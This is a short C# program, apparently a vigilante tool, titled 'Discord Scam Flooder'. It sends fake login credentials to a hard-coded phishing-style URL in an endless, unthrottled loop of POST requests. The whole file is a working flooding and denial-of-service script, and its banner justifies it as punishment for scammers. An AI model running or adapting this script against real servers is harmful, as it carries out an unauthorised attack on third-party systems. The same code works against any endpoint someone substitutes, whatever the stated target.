namespace DiscordScamSpam
{
    static class Program
    {
        static async Task Main(string[] args)
        {
            Console.WriteLine("###############################################");
            Console.WriteLine("## DISCORD SCAM FLOODER BY AXON TECHNOLOGIES ##");
            Console.WriteLine("## THIS IS WHAT YOU GET FOR SCAMMING PEOPLE! ##");
            Console.WriteLine("###############################################\n");
            string endpoint = "https://disocrds.gift/discord/login";
            long sent = 0;
            string payload = "{\"login\":\"RAIDED_BY_AXON_TECHNOLOGIES\",\"password\":\"RAIDED_BY_AXON_TECHNOLOGIES\"}";
            HttpClient httpClient = new HttpClient();
            HttpContent httpContent = new StringContent(payload);
            Console.Write("POSTed 0 Payloads.");
            do
            {
                httpClient.PostAsync(endpoint, httpContent).ConfigureAwait(false);
                sent++;
                Console.Write($"\rPOSTed {sent} Payloads.");
            } while (true);
        }
    }
}
